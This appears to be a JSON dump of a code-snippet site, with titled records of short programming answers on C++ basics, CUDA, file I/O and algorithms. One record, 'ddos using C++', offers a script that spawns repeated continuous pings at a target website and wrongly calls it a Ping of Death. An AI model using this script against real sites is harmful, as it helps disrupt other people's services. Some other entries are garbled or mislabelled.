    "description": "// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1726,
    "keyword": null,
    "link": null,
    "title": " create dynamic array c++",
    "description": "int main() {   int size;    std::cin >> size;    int *array = new int[size];    delete [] array;    return 0; }\nint* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \n#include <iostream> #include <cstddef> // std::size_t   int main() {     std::cout << \"Enter a positive integer: \";     std::size_t length{};     std::cin >> length;       int *array{ new int[length]{} }; // use array new.  Note that length does not need to be constant!       std::cout << \"I just allocated an array of integers of length \" << length << '\\n';       array[0] = 5; // set element 0 to value 5       delete[] array; // use array delete to deallocate array       // we don't need to set array to nullptr/0 here because it's going to go out of scope immediately after this anyway       return 0; }\nint length = 50; int *array = new int[length](); // returns 50 length array of 0\nint main() {   int size;    std::cin >> size;    int *array = new int[size];    delete [] array;    return 0; } \n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1727,
    "keyword": null,
    "link": null,
    "title": " create dynamic variable c++",
    "description": "// Delete pointer int* ptr1 = new int; delete ptr1;  // Delete array int* array = new int[10]; delete[] array;  \ncout<<\"Dinmuhammad\";\n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1728,
    "keyword": null,
    "link": null,
    "title": " create file c++",
    "description": "// reading a text file #include <iostream> #include <fstream> #include <string> using namespace std;  int main () {   string line;   ifstream myfile (\"example.txt\");   if (myfile.is_open())   {     while ( getline (myfile,line) )     {       //use line here     }     myfile.close();   }    else cout << \"Unable to open file\";     return 0; }\n#include <iostream> #include <fstream> using namespace std;  int main() {   // Create and open a text file   ofstream MyFile(\"filename.txt\");    // Write to the file   MyFile << \"Files can be tricky, but it is fun enough!\";    // Close the file   MyFile.close(); \n// using ofstream constructors. #include <iostream> #include <fstream>    std::ofstream outfile (\"test.txt\");  outfile << \"my text here!\" << std::endl;  outfile.close(); \n",
    "reg_date": "2021-10-12T11:39:35.000Z"
  },
  {
    "id": 1729,
    "keyword": null,
    "link": null,
    "title": " create large integers with powers of 10 cpp",
    "description": "int large_integer  = pow(10, 7);\n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1730,
    "keyword": null,
    "link": null,
    "title": " create loop c++",
    "description": "for (int i; i < 10; i++) {   cout << i << \"\\n\"; }\n// There are 2 loops in ++ :  while(1==1){  } //    |  |   |  //     |   What happens while condition is true //     |     //    the condition   //for loop  for (int i; i < 10; i++){    } //   |___|  |___|   |_|  |__| //     |      |      |     |  //     |      |      |     what happens when conditons is true //     |      |     what happens each time loop is reapeted //     |      The condition in wich the loop is true //     a variable declaratoin\n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1731,
    "keyword": null,
    "link": null,
    "title": " create matrix cpp",
    "description": "typedef std::vector<std::vector<double> > Matrix; //with initialization Matrix matrix1 = { {0.1,1.1,.2},                  {.4,.5,.6},                   {.8,.9,.10}                 }; //just initiation (3x3) Matrix matrix2(3, std::vector<double>(3) );\n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1732,
    "keyword": null,
    "link": null,
    "title": " create new file c++",
    "description": "#include <iostream> #include <fstream> using namespace std;  int main() {   // Create and open a text file   ofstream MyFile(\"filename.txt\");    // Write to the file   MyFile << \"Files can be tricky, but it is fun enough!\";    // Close the file   MyFile.close(); \n// using ofstream constructors. #include <iostream> #include <fstream>    std::ofstream outfile (\"test.txt\");  outfile << \"my text here!\" << std::endl;  outfile.close(); \n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1733,
    "keyword": null,
    "link": null,
    "title": " create new node in tree",
    "description": "TreeNode* root = new TreeNode(val);\n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1734,
    "keyword": null,
    "link": null,
    "title": " create random vectors c++",
    "description": "#include <random> #include <algorithm> #include <iterator> #include <iostream> #include <functional>  using namespace std;  int main() {     // First create an instance of an engine.     random_device rnd_device;     // Specify the engine and distribution.     mt19937 mersenne_engine {rnd_device()};  // Generates random integers     uniform_int_distribution<int> dist {1, 52};      auto gen = [&dist, &mersenne_engine](){                    return dist(mersenne_engine);                };      vector<int> vec(10);     generate(begin(vec), end(vec), gen);      // Optional     for (auto i : vec) {         cout << i << \" \";     }   } \n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1735,
    "keyword": null,
    "link": null,
    "title": " create vector of specific size c++",
    "description": "// create a vector with 20 integer elements std::vector<int> arr(20);  for(int x = 0; x < 20; ++x)    arr[x] = x; \n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1736,
    "keyword": null,
    "link": null,
    "title": " create vector with fixed size c++",
    "description": "std::vector<int> v(10); v.size(); //returns 10 \n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1737,
    "keyword": null,
    "link": null,
    "title": " create vectors of vectors c++",
    "description": "typedef std::vector<std::vector<double> > Matrix;  Matrix matrix = { {0.1,1.1,.2},                  {.4,.5,.6},                   {.8,.9,.10}                 }; // Just initilization: int rows = 3; int cols = 3; Matrix m3(rows, std::vector<double>(cols) );\n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1738,
    "keyword": null,
    "link": null,
    "title": " creating lps table in kmp algoritm",
    "description": "#include<bits/stdc++.h> using namespace std; void createlps(int lps[],string pattern,int n) {     int i=0;     int j=1;     lps[0]=0;     while(j<n)     {         if(pattern[i]==pattern[j])         {             lps[j]=i+1;             i++;             j++;         }         else         {             if(i!=0)             {                 i=lps[i-1];             }             else             {                 lps[j]=0;                 j++;             }         }     } } int main() {     string pattern;     cin>>pattern;     int n=pattern.size();     int lps[n];     createlps(lps,pattern,n);     for(int i=0;i<n;i++)     {         cout<<lps[i]<<\" \";     } } \n",
    "reg_date": "2021-10-12T11:39:36.000Z"
  },
  {
    "id": 1739,
    "keyword": null,
    "link": null,
    "title": " creating node in c++",
    "description": "#include <iostream>  using namespace std;  struct node {     int data;     node *next; };  class linked_list { private:     node *head,*tail; public:     linked_list()     {         head = NULL;         tail = NULL;     }      void add_node(int n)     {         node *tmp = new node;         tmp->data = n;         tmp->next = NULL;          if(head == NULL)         {             head = tmp;             tail = tmp;         }         else         {             tail->next = tmp;             tail = tail->next;         }     } };  int main() {     linked_list a;     a.add_node(1);     a.add_node(2);     return 0; }\n#include <iostream>  using namespace std;  struct node {     int data;     node *next; }; \n",
    "reg_date": "2021-10-12T11:39:37.000Z"
  },
  {
    "id": 1740,
    "keyword": null,
    "link": null,
    "title": " creator of C++",
    "description": "Designed by Bjarne Stroustrup\n",
    "reg_date": "2021-10-12T11:39:37.000Z"
  },
  {
    "id": 1741,
    "keyword": null,
    "link": null,
    "title": " crow c++",
    "description": "#include \"crow.h\"  int main() {     crow::SimpleApp app;      CROW_ROUTE(app, \"/\")([](){         return \"Hello world\";     });      app.port(18080).multithreaded().run(); }\n",
    "reg_date": "2021-10-12T11:39:37.000Z"
  },
  {
    "id": 1742,
    "keyword": null,
    "link": null,
    "title": " crtdbg c++",
    "description": "detect memory leaks // https://docs.microsoft.com/fr-fr/visualstudio/debugger/finding-memory-leaks-using-the-crt-library?view=vs-2019\n",
    "reg_date": "2021-10-12T11:39:37.000Z"
  },
  {
    "id": 1743,
    "keyword": null,
    "link": null,
    "title": " crypto npm random bytes",
    "description": "// Asynchronous const crypto = require('crypto'); crypto.randomBytes(256, (err, buf) => {   if (err) throw err;   console.log(`${buf.length} bytes of random data: ${buf.toString('hex')}`); });\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1744,
    "keyword": null,
    "link": null,
    "title": " crystal ball c++",
    "description": "#include<iostream>  inline int f(int exp, int balls);  int f(int exp, int balls) {        if(exp == 0 || balls == 0)         return 0 ;      return f(exp-1, balls)+ f(exp-1,balls-1)+1 ;  } int main() {     int experince{0};     int balls {0};     int floors {0};     std::cout<<\"Please enter the number of floors: \";     std::cin>>floors;     std::cout <<\"\\nPlease enter the number of balls: \";     std::cin>>balls;      while(true)     {         ++experince;         if(f(experince,balls) >= floors)             break;     }      std::cout<<\"\\nNumber experince required \"<<experince<<std::endl;     return 0 ; }\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1745,
    "keyword": null,
    "link": null,
    "title": " css window id",
    "description": "<link rel=\"stylesheet\" media=\"screen and (min-device-width: 800px)\" href=\"800.css\" />\n<link rel=\"stylesheet\" type=\"text/css\" href=\"main.css\" /> <link id=\"size-stylesheet\" rel=\"stylesheet\" type=\"text/css\" href=\"narrow.css\" />\nfunction adjustStyle(width) {   width = parseInt(width);   if (width < 701) {     $(\"#size-stylesheet\").attr(\"href\", \"css/narrow.css\");   } else if (width < 900) {     $(\"#size-stylesheet\").attr(\"href\", \"css/medium.css\");   } else {      $(\"#size-stylesheet\").attr(\"href\", \"css/wide.css\");    } }  $(function() {   adjustStyle($(this).width());   $(window).resize(function() {     adjustStyle($(this).width());   }); });\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1746,
    "keyword": null,
    "link": null,
    "title": " csv file management using c++",
    "description": "// csv.d  void main() {      import std;       File[string] outputFiles;      auto inputFile = File(\"input.csv\");      auto lines = inputFile.byLine;      lines.popFront; // skip header       foreach (line; lines) {          const name = line.splitter(',').front;          // open output file if not already open in append mode           if (name !in outputFiles) {               outputFiles[name] = File(name ~ \".csv\", \"a\");         }          outputFiles[name].writeln(line);     } }\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1747,
    "keyword": null,
    "link": null,
    "title": " cube mapping sdl",
    "description": "if   \n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1748,
    "keyword": null,
    "link": null,
    "title": " cudaMalloc",
    "description": "int * d_array; cudamalloc((void **) &d_array, size*sizeof(int))\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1749,
    "keyword": null,
    "link": null,
    "title": " cuda allocate memory",
    "description": "  const size_t SIZE = 900;   float *abc;   cudaMalloc((void **)&abc, SIZE * SIZE * sizeof(float));\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1750,
    "keyword": null,
    "link": null,
    "title": " cuda atomic inc",
    "description": "unsigned int atomicInc(unsigned int* address,                        unsigned int val); //reads the 32-bit word old located at the address address in global or shared memory,  //computes ((old >= val) ? 0 : (old+1)),  //and stores the result back to memory at the same address.  //These three operations are performed in one atomic transaction.  //The function returns old.  //example of use int idx = atomicInc(&array[i], n);\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1751,
    "keyword": null,
    "link": null,
    "title": " cuda atomic swap",
    "description": "int atomicCAS(int* address, int compare, int val); //reads the 16-bit, 32-bit or 64-bit word old located at the address  //address in global or shared memory, computes  //(old == compare ? val : old) , and stores the result back to memory  //at the same address. These three operations are performed in one  //atomic transaction. The function returns old (Compare And Swap).\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1752,
    "keyword": null,
    "link": null,
    "title": " cuda copy memory",
    "description": "cudaMemcpy(d_dst, h_src, N*sizeof(float), cudaMemcpyHostToDevice); cudaMemcpy(h_dst, d_src, N*sizeof(float), cudaMemcpyDeviceToHost);\n",
    "reg_date": "2021-10-12T11:39:38.000Z"
  },
  {
    "id": 1753,
    "keyword": null,
    "link": null,
    "title": " cuda dim3",
    "description": "// dim3 can take 1, 2, or 3 argumetns: dim3 blocks1D( 5       ); dim3 blocks2D( 5, 5    ); dim3 blocks3D( 5, 5, 5 ); \n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1754,
    "keyword": null,
    "link": null,
    "title": " cuda lock",
    "description": "//d_lock must be initialized to 0 bool success = false; while(!success) {   if (atomicCAS(&d_lock[i], 0, 1) == 0) {      //critical section      \tsuccess = true;     atomicExch(&d_lock[i], 0);   } }\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1755,
    "keyword": null,
    "link": null,
    "title": " cuda locks",
    "description": "//d_lock must be initialized to 0 bool success = false; while(!success) {   if (atomicCAS(&d_lock[i], 0, 1) == 0) {      //critical section      \tsuccess = true;     atomicExch(&d_lock[i], 0);   } }\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1756,
    "keyword": null,
    "link": null,
    "title": " cuda shared array",
    "description": "extern __shared__ int buf[];  //when you launch the kernel you should launch it this way;  kernel<<<blocks,threads,numbytes_for_shared>>>(...);\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1757,
    "keyword": null,
    "link": null,
    "title": " cuda shared variable",
    "description": "__shared__ float sum;\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1758,
    "keyword": null,
    "link": null,
    "title": " cudamemcpy",
    "description": "cudaMemcpy(dst_array, src_array, size*sizeof(int),  cudaMemcpyHostToDevice)  //cudaMemcpyHostToHost, cudaMemcpyHostToDevice, cudaMemcpyDeviceToHost, or cudaMemcpyDeviceToDevice\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1759,
    "keyword": null,
    "link": null,
    "title": " cudamemcpyasync",
    "description": "cudaStream_t streams[3];  for (int i = 0; i < 3; i++) { \tcudaStreamCreate(&streams[i]); }  cudaMemcpyAsync(h_array_1, d_array_1, size_1 * sizeof(int), cudaMemcpyDeviceToHost, streams[0]); cudaMemcpyAsync(h_array_2, d_array_2, size_2 * sizeof(int), cudaMemcpyDeviceToHost, streams[1]); cudaMemcpyAsync(h_array_3, d_array_3, size_3 * sizeof(int), cudaMemcpyDeviceToHost, streams[2]);  cudaDeviceSynchronize();  for (int i = 0; i < 3; i++) { \tcudaStreamDestroy(streams[i]); }\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1760,
    "keyword": null,
    "link": null,
    "title": " cum faci ca o caseta sa nu se miste css",
    "description": "<html> \t<head> \t\t<title>Log in - WebApplication</title> \t</head> \t<body bgcolor=\"#F8F8FF\"> \t\t<div style=\"border-bottom: 1px solid #D3D3D3; background: white; font-family:'Segoe UI' \"> \t\t\t<div style=\" margin-left: 150px; padding-top: 15px; padding-bottom: 25px;  height: 30px; \"> \t\t\t\t<div style=\"float: left; overflow: hidden; width: 210px; height: 40px;\"><a href=\"WebAplication.html\" style=\"color: #708090; text-decoration: none; font-size: 30px; \">WebApplication</a></div> \t\t\t\t<div style=\"padding-top: 10.5px;\"><div style=\"margin-left: 25px; float: left;overflow: hidden; width: 55px; height: 23px;\"><a href=\"Home - WebAplication.html\" style=\"color: #708090; text-decoration: none;  font-size: 20px;\"><u>Home</u></a></div> \t\t\t\t<div style=\"float: left; overflow: hidden; width: 65px; height: 30px;  margin-left: 18px;\"><a href=\"Privacy - WebApplication.html\"  \t\t\t\t\tstyle=\"color: #708090; text-decoration: none;  font-size: 20px;\">Privacy</a></div> \t\t\t\t<div style=\"float: left; overflow: hidden; width: 74px; height: 28px; margin-left: 1098px;\"><a href=\"Register - WebAplication.html\" style=\"color: #708090; text-decoration: none;  font-size: 20px;\">Register</a></div> \t\t\t\t<div style=\" float: left; overflow: hidden; width: 50px; height: 30px; margin-left: 12px;\"><a href=\"Log in - WebApplication.html\"  \t\t\t\t\tstyle=\"color: black; text-decoration: none;  font-size: 20px;\"><u>Login</u></a></div></div> \t\t\t</div> \t\t</div>  \t\t<div style=\"font-size: 50px; margin-left: 157px; margin-top: 18px; font-family:'Segoe UI'\"> \t\t\tLog in \t\t</div> \t\t<table style=\"font-size: 40px; margin-left: 155px;\"> \t\t\t<tr> \t\t\t\t<td><div style=\"border-bottom: 1px solid #D3D3D3; font-family:'Segoe UI'\"> \t\t\t\t<div style=\"margin-bottom: 30px; font-family:'Segoe UI'\">Use a local account to Log in.</div></div></td> \t\t\t\t<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td> \t\t\t\t<td><div style=\"border-bottom: 1px solid #D3D3D3; font-family:'Segoe UI'\"> \t\t\t\t<div style=\"margin-bottom: 30px;\">Use another service to Log in.</div></div></td> \t\t\t</tr> \t\t</table> \t\t<table style=\"font-size: 25px; margin-left: 157px; boder: 3px; margin-top: 30px;\"> \t\t\t<tr> \t\t\t\t<td>Email<br><input type=\"text\" style=\"font-size: 30px; margin-top: 10px;\" /></td> \t\t\t\t<td><div style=\"margin-left: 255px;\">Thare are no external authentication service configured. See this  \t\t\t\t<a href=\"\" style=\"color: blue; text-decoration: none;\"> \t\t\t\tarticle<br> about setting up this ASP.NET application to support loggin in via external<br> services.</a></div></td> \t\t\t</tr> \t\t</table> \t\t<div style=\"font-size: 25px; margin-left: 162px; margin-top: 20px; font-family:'Segoe UI'\"> \t\t\tPassword \t\t\t<br> \t\t\t<input type=\"text\" style=\"font-size: 30px; margin-top: 10px;\"> \t\t\t<div style=\" margin-top: 30px; font-family:'Segoe UI'\"> \t\t\t\t<input type=\"checkbox\">&nbsp;&nbsp;Remember me? \t\t\t\t<br> \t\t\t\t<div style=\"margin-top: 30px; font-family:'Segoe UI'\"> \t\t\t\t\t<input type=\"button\" value=\"Log in\"  \t\t\t\t\t\tstyle=\"color: white; font-size: 30px; background: #0066ff; border: solid #0066ff 1px; border-radius: 5px;\"> \t\t\t\t</div> \t\t\t</div> \t\t\t<div style=\"margin-top: 20px; font-family:'Segoe UI'\"> \t\t\t\t<a href=\"\" style=\"text-decoration: none; color: blue;\">Forgot your password?</a> \t\t\t</div> \t\t\t<div style=\"margin-top: 20px; font-family:'Segoe UI'\"> \t\t\t\t<a href=\"\" style=\"text-decoration: none; color: blue;\">Register as a new user</a> \t\t\t</div> \t\t\t<div style=\"margin-top: 20px;\"> \t\t\t\t<a href=\"\" style=\"text-decoration: none; color: blue;\">Resed email confirmation</a> \t\t\t</div> \t\t</div> \t\t<div style=\"position: fixed; bottom: 0; left: 0; right: 0; height: 50px; background-color: #F8F8FF; opacity: 0.6; \t\tfont-family:'Segoe UI' border-top: black solid 1px;\"> \t\t\t<div style=\"border-top: #D3D3D3 solid 1px;\"> \t\t\t\t<div style=\"margin-top: 15px; margin-left: 160px;\"> \t\t\t\t\t<img src=\"C:\\html training\\0208\\c.png\" width=\"15px\" height=\"15px\"> \t\t\t\t\t2021 - WebApplication3 - <a href=\"Privacy - WebApplication.html\"  \t\t\t\t\tstyle=\"color: blue; text-decoration: none;\">Privacy</a> \t\t\t\t</div> \t\t\t</div> \t\t</div> \t</body> </html>\t\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1761,
    "keyword": null,
    "link": null,
    "title": " currency converter for c++",
    "description": "#include <iostream>  using namespace std;  int main(){      string currency;      string currency2;      double amount;      double amount2;      cout << \"What currency would you like to convert? \\n\";      cout << \"The currencies are: Rupees, Dollars, Pesos, and Euros. \\n\";      cin >> currency;      cout << \"What currency would you like to convert to? \\n\";      cin >> currency2;      cout << \"How much money would you like to convert? \\n\";      cin >> amount;       if (currency == \"dollars\"){          if (currency2 == \"rupees\"){              amount2 = amount * 72.51;              cout << amount << \"$ is equal to \" << amount2 << \"₹\\n\";          }else if (currency2 == \"pesos\"){              amount2 = amount * 19.95;              cout << amount << \"$ is equal to \" << amount2 << \"Mex$\\n\";          }else if (currency2 == \"euros\"){              amount2 = amount * .82;              cout << amount << \"$ is equal to \" << amount2 << \"&euro;\\n\";          }      }else if (currency == \"rupees\"){                  if (currency2 == \"dollars\"){              amount2 = amount * .014;              cout << amount << \"₹ is equal to \" << amount2 << \"$\\n\";          }else if (currency2 == \"pesos\"){              amount2 = amount * .28;              cout << amount << \"₹ is equal to \" << amount2 << \"Mex$\\n\";          }else if (currency2 == \"euros\"){              amount2 = amount * .011;              cout << amount << \"₹ is equal to \" << amount2 << \"&euro;\\n\";          }      }else if (currency == \"pesos\"){              if (currency2 == \"dollars\"){                  amount2 = amount * .050;                  cout << amount << \" Mex$ is equal to \" << amount2 << \"$\\n\";              }else if (currency2 == \"rupees\"){                  amount2 = amount * 3.64;                  cout << amount << \" Mex$ is equal to \" << amount2 << \"₹\\n\";              }else if (currency2 == \"euros\"){                  amount2 = amount * .041;                  cout << amount << \"Mex$ is equal to \" << amount2 << \"&euro;\\n\";              }      }else if (currency == \"euros\"){          if (currency2 == \"dollars\"){              amount2 = amount * 1.22;              cout << amount << \"&euro; is equal to \" << amount2 << \"$\\n\";          }else if (currency2 == \"pesos\"){              amount2 = amount * 24.39;              cout << amount << \"&euro; is equal to \" << amount2 << \"Mex$\\n\";          }else if (currency2 == \"rupees\"){              amount2 = amount * 88.68;              cout << amount << \"&euro; is equal to \" << amount2 << \"₹\\n\";          }      }else{          cout << \"Invalid entry. (check spelling!)\\n\";      }  }\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1762,
    "keyword": null,
    "link": null,
    "title": " cv::VideoWriter::fourcc('H','2','6','4'), 10, Size(frame width,frame height));",
    "description": "import cv2# function video capturecameraCapture = cv2.VideoCapture(0)# rame rate or frames per secondfps = 30 # Width and height of the frames in the video streamsize = (int(cameraCapture.get(cv2.CAP_PROP_FRAME_WIDTH)),\t\t\tint(cameraCapture.get(cv2.CAP_PROP_FRAME_HEIGHT))) \"\"\"Create a VideoWriter object. We should specify the output file name (eg: MyOutput.avi). Then we should specify the FourCC. Then number of frames per second (fps) and frame size should be passed. May specify isColor flag. If it is True, encoder expect color frame, otherwise it works with grayscale frame.FourCC is a 4-byte code used to specify the video codec. The list of available codes can be found in fourcc.org. It is platform dependent.\"\"\" videoWriter = cv2.VideoWriter('MyOutput.avi',     cv2.VideoWriter_fourcc('I','4','2','0'), fps, size) success, frame = cameraCapture.read() # some variablenumFramesRemaining = 10*fps - 1 # loop until there are no more frames and variable > 0while success and numFramesRemaining > 0:    videoWriter.write(frame)    success, frame = cameraCapture.read()    cv2.imshow('frame',frame)    cv2.waitKey(1)    numFramesRemaining -= 1 #Closes video file or capturing devicecameraCapture.release()\n",
    "reg_date": "2021-10-12T11:39:39.000Z"
  },
  {
    "id": 1763,
    "keyword": null,
    "link": null,
    "title": " cv2: [ WARN:0] global cap msmf.cpp (674) SourceReaderCB::~SourceReaderCB terminating async callback",
    "description": "cv2: [ WARN:0] global cap_msmf.cpp (674) SourceReaderCB::~SourceReaderCB terminating async callback\n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1764,
    "keyword": null,
    "link": null,
    "title": " cvtcolor rgb to gray",
    "description": "img_gray_mode = cv2.imread(path, cv2.IMREAD_GRAYSCALE)\ncv::Mat img cv::cvtColor(img, img, CV_BGR2GRAY);\n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1765,
    "keyword": null,
    "link": null,
    "title": " cycle detection in directed graph",
    "description": "//Cycle Detection in a directed graph using BFS ( Khan's Algorithm ) #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v); } bool isCyclic(vector<int>adj[],int n) {     queue<int>q;     vector<int>vec(n,0);     for(int i=0;i<n;i++)     {         for(auto j:adj[i])         {             vec[j]++;         }     }     for(int i=0;i<n;i++)     {         if(vec[i]==0)         {             q.push(i);         }     }     int count=0;     while(!q.empty())     {         int val=q.front();         q.pop();         count++;         for(auto j:adj[val])         {             vec[j]--;             if(vec[j]==0)             {                 q.push(j);             }         }     }     if(count==n)     {         return false;     }   return true; } int main() {     int vertex,edges;     cout<<\"Enter the number of vertex and edges:\"<<endl;     cin>>vertex>>edges;     vector<int>adj[vertex];     int a,b;     cout<<\"Enter the Links:\"<<endl;     for(int i=0;i<vertex;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     if(isCyclic(adj,vertex))     {         cout<<\"Yes\"<<endl;     }     else     {         cout<<\"No\"<<endl;     }     return 0; }  \n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1766,
    "keyword": null,
    "link": null,
    "title": " cyclic array rotation in cpp",
    "description": "// Array Rotations  #include <bits/stdc++.h>  using namespace std;  void arrayRotation(int arr[], int n){     int last = arr[n-1];     for(int i=n-1;i>0;i--)     arr[i] = arr[i-1];     arr[0] = last; }  int main(){     int n,i,turns;     // size of the array     cin >> n;          int arr[n];     for(i=0;i<n;i++)     cin >> arr[i];      // Number of times the array is to be rotated     cin >> turns;      for(i=0;i<turns;i++)     arrayRotation(arr,n);      for(i=0;i<n;i++)     cout << arr[i] << \" \";      return 0;  }\n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1767,
    "keyword": null,
    "link": null,
    "title": " data type in c++",
    "description": " \t\t\t\t\t\t  Data types in c++ \tBuilt-in                User Defined            Derived     ----------              -----------             ------------     void, int,\t\t\t    structure,              array, \tchar, float,\t\t    union,\t\t\t\t\tfunction,     double, bool,\t\t    enum,\t\t\t\t\tpointer,     long long\t\t\t    class,\t\t\t\t\treference     Wide Character\t\t    typedef\nLong Data Type\t          Size             (in bytes)\tRange long int\t            4\t         -2,147,483,648 to 2,147,483,647 unsigned long int\t    4\t         0 to 4,294,967,295 long long int\t        8\t         -(2^63) to (2^63)-1 unsigned long long int\t8\t         0 to 18,446,744,073,709,551,615\nint myNum = 5;               // Integer (whole number) float myFloatNum = 5.99;     // Floating point number double myDoubleNum = 9.98;   // Floating point number char myLetter = 'D';         // Character bool myBoolean = true;       // Boolean string myText = \"Hello\";     // String\ndata type in c++\n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1768,
    "keyword": null,
    "link": null,
    "title": " data types in c++",
    "description": " \t\t\t\t\t\t  Data types in c++ \tBuilt-in                User Defined            Derived     ----------              -----------             ------------     void, int,\t\t\t    structure,              array, \tchar, float,\t\t    union,\t\t\t\t\tfunction,     double, bool,\t\t    enum,\t\t\t\t\tpointer,     long long\t\t\t    class,\t\t\t\t\treference     Wide Character\t\t    typedef\nLong Data Type\t          Size             (in bytes)\tRange long int\t            4\t         -2,147,483,648 to 2,147,483,647 unsigned long int\t    4\t         0 to 4,294,967,295 long long int\t        8\t         -(2^63) to (2^63)-1 unsigned long long int\t8\t         0 to 18,446,744,073,709,551,615\nData Type \t\t\t\t\t\t\t\t\t\tSize int (Integer) = 5, 6, 7\t\t\t\t\t\t\t2 float (Floating Value) = -3.67, 2.67\t\t\t4 double (Double of float) = -7.8746\t\t\t\t8 char (Character) = \t'a', 'b', 'A'\t\t\t\t1 string (Multiple chars) = \"Hello World\" \t\tNo of Chars bool (Boolean) = true, false\t\t\t\t\ttrue = 1, false = 0\nint myNum = 5;               // Integer (whole number) float myFloatNum = 5.99;     // Floating point number double myDoubleNum = 9.98;   // Floating point number char myLetter = 'D';         // Character bool myBoolean = true;       // Boolean string myText = \"Hello\";     // String\ndata type in c++\ndata type\n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1769,
    "keyword": null,
    "link": null,
    "title": " date to string c++",
    "description": "#include <ctime> #include <iostream> using namespace std;  int main() { \ttime_t curr_time; \ttm * curr_tm; \tchar date_string[100]; \tchar time_string[100]; \t \ttime(&curr_time); \tcurr_tm = localtime(&curr_time); \t \tstrftime(date_string, 50, \"Today is %B %d, %Y\", curr_tm); \tstrftime(time_string, 50, \"Current time is %T\", curr_tm); \t \tcout << date_string << endl; \tcout << time_string << endl; \t \treturn 0; }\n#include <ctime> #include <iostream> using namespace std;  int main() { \ttime_t curr_time; \ttm * curr_tm; \tchar date_string[100]; \tchar time_string[100]; \t \ttime(&curr_time); \tcurr_tm = localtime(&curr_time); \t \tstrftime(date_string, 50, \"Today is %B %d, %Y\", curr_tm); \tstrftime(time_string, 50, \"Current time is %T\", curr_tm); \t \tcout << date_string << endl; \tcout << time_string << endl; \t \treturn 0; } \n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1770,
    "keyword": null,
    "link": null,
    "title": " days in a year c++",
    "description": "in a leap year 366 days \n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1771,
    "keyword": null,
    "link": null,
    "title": " ddos using C++",
    "description": "/* \tProgram to perform Ping Of Death (POD) attack using C++ */ #include <bits/stdc++.h> using namespace std; int main (void) {     int i, j;     for (i = 0; i <= 100; i++) {         system(\"start ddos.bat\");     }     return 0; }  Make a file called ddos.bat and place both .cpp and .bat file in same folder  @echo off color 0a ping www.yourwebsitehere.com -t\n",
    "reg_date": "2021-10-12T11:39:40.000Z"
  },
  {
    "id": 1772,
    "keyword": null,
    "link": null,
    "title": " debugging c++",
    "description": "Run the code with gdb ./yourCode  Use 'run' command to start the program.  When it crashes use 'bt'(back trace) command to find where it happened.\n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1773,
    "keyword": null,
    "link": null,
    "title": " decimal to binary",
